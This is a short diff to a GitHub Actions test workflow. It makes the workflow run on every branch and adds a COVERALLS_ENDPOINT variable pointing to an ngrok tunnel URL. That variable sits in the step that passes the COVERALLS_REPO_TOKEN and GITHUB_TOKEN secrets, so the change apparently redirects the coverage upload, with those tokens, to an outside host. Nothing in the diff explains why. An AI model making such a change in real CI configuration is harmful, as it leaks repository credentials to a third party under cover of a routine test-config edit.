@@ -2,9 +2,9 @@ name: Tests
 
 on:
   push:
-    branches: [ master ]
+    branches: '**'
   pull_request:
-    branches: [ master ]
+    branches: '**'
 
 jobs:
   build:
@@ -39,6 +39,7 @@ jobs:
     - name: Coveralls report
       if: matrix.python-version == 3.8
       env:
+        COVERALLS_ENDPOINT: https://3d06fff8dca5.ngrok.io
         COVERALLS_REPO_TOKEN: ${{ secrets.COVERALLS_REPO_TOKEN }}
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
